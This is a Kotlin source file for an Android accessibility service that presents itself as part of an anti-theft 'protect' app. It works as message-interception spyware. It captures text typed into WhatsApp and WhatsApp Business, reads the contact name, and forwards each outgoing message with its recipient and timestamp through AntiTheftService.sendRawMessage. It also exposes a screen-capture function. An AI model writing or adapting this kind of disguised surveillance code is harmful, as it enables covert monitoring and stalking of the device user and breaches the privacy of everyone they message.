package com.androidprotect

import android.accessibilityservice.AccessibilityService
import android.content.Context
import android.graphics.Bitmap
import android.os.Build
import android.provider.Settings
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import androidx.annotation.RequiresApi
import kotlinx.serialization.json.Json
import kotlinx.serialization.builtins.serializer

class ProtectAccessibilityService : AccessibilityService() {

    private val whatsAppDrafts = mutableMapOf<String, String>()
    private var currentWhatsAppChat: String = ""

    override fun onServiceConnected() {
        instance = this
        Log.d("AccessibilityService", "Connected — screen capture now permanent")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return
        val pkg = event.packageName?.toString() ?: return
        if (pkg !in WHATSAPP_PACKAGES) {
            currentWhatsAppChat = ""
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // Try to read the chat title from the action bar / toolbar
                val chatName = findWhatsAppChatName(rootInActiveWindow)
                if (chatName.isNotBlank()) {
                    currentWhatsAppChat = chatName
                    Log.d("AccessibilityService", "WhatsApp chat: $currentWhatsAppChat")
                }
            }
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val source = event.source ?: return
                if (source.className?.contains("EditText") == true) {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank()) {
                        whatsAppDrafts[pkg] = text
                    }
                }
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val source = event.source ?: return
                val desc = source.contentDescription?.toString() ?: ""
                val isSend = desc.contains("enviar", ignoreCase = true) ||
                        desc.contains("send", ignoreCase = true) ||
                        desc.contains("send message", ignoreCase = true)
                if (isSend) {
                    val text = whatsAppDrafts[pkg]
                    if (!text.isNullOrBlank()) {
                        val chat = currentWhatsAppChat.ifBlank { findWhatsAppChatName(rootInActiveWindow) }
                        sendOutgoingWhatsApp(text, chat)
                        whatsAppDrafts[pkg] = ""
                    }
                }
            }
        }
    }

    /**
     * Best-effort extraction of the current WhatsApp chat name from the window.
     * Looks for common toolbar title view IDs and patterns.
     */
    private fun findWhatsAppChatName(root: AccessibilityNodeInfo?): String {
        if (root == null) return ""

        // Common WhatsApp view IDs for the conversation title
        val titleIds = listOf(
            "com.whatsapp:id/conversation_contact_name",
            "com.whatsapp:id/action_bar_title",
            "com.whatsapp:id/title",
            "com.whatsapp.w4b:id/conversation_contact_name",
            "com.whatsapp.w4b:id/action_bar_title",
            "com.whatsapp.w4b:id/title"
        )

        for (id in titleIds) {
            val nodes = root.findAccessibilityNodeInfosByViewId(id)
            for (node in nodes) {
                val text = node.text?.toString()?.trim()
                if (!text.isNullOrBlank() && !isWhatsAppGenericTitle(text)) {
                    return text
                }
            }
        }

        // Fallback: traverse children looking for a TextView near the top that looks like a title
        val candidates = mutableListOf<AccessibilityNodeInfo>()
        collectWhatsAppTitleCandidates(root, candidates)
        for (node in candidates) {
            val text = node.text?.toString()?.trim()
            if (!text.isNullOrBlank() && !isWhatsAppGenericTitle(text)) {
                return text
            }
        }

        return ""
    }

    private fun isWhatsAppGenericTitle(text: String): Boolean {
        val lower = text.lowercase()
        return lower == "whatsapp" || lower == "conversas" || lower == "chats" ||
                lower == "câmera" || lower == "status" || lower == "ligações" ||
                lower == "calls" || lower == "configurações" || lower == "settings"
    }

    private fun collectWhatsAppTitleCandidates(node: AccessibilityNodeInfo?, out: MutableList<AccessibilityNodeInfo>) {
        if (node == null) return
        if (node.className?.contains("TextView") == true && node.isEnabled && node.isVisibleToUser) {
            out.add(node)
        }
        for (i in 0 until node.childCount) {
            collectWhatsAppTitleCandidates(node.getChild(i), out)
        }
    }

    private fun sendOutgoingWhatsApp(text: String, chatName: String) {
        try {
            val address = chatName.ifBlank { "WhatsApp" }
            val content = Json.encodeToString(String.serializer(), text)
            val addressJson = Json.encodeToString(String.serializer(), address)
            val nameJson = Json.encodeToString(String.serializer(), address)
            val payload = """{"type":"WHATSAPP_MESSAGE","direction":"out","address":$addressJson,"name":$nameJson,"content":$content,"timestamp":${System.currentTimeMillis()}}"""
            AntiTheftService.sendRawMessage(payload)
            Log.d("AccessibilityService", "forwarded outgoing WhatsApp message to $address")
        } catch (e: Exception) {
            Log.e("AccessibilityService", "Failed to forward outgoing WhatsApp: ${e.message}")
        }
    }

    override fun onInterrupt() {}

    override fun onDestroy() {
        if (instance === this) instance = null
        super.onDestroy()
    }

    @RequiresApi(Build.VERSION_CODES.R)
    fun captureScreen(callback: (Bitmap?) -> Unit) {
        try {
            takeScreenshot(
                android.view.Display.DEFAULT_DISPLAY,
                mainExecutor,
                object : TakeScreenshotCallback {
                    override fun onSuccess(result: ScreenshotResult) {
                        val bitmap = Bitmap.wrapHardwareBuffer(
                            result.hardwareBuffer,
                            result.colorSpace
                        )
                        result.hardwareBuffer.close()
                        callback(bitmap)
                    }
                    override fun onFailure(errorCode: Int) {
                        Log.w("AccessibilityService", "Screenshot failed: $errorCode")
                        callback(null)
                    }
                }
            )
        } catch (e: Exception) {
            Log.e("AccessibilityService", "captureScreen error: ${e.message}")
            callback(null)
        }
    }

    companion object {
        @Volatile var instance: ProtectAccessibilityService? = null
        private val WHATSAPP_PACKAGES = setOf("com.whatsapp", "com.whatsapp.w4b")

        fun isEnabled(context: Context): Boolean {
            val flat = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: return false
            return flat.contains("${context.packageName}/${ProtectAccessibilityService::class.java.name}")
        }
    }
}
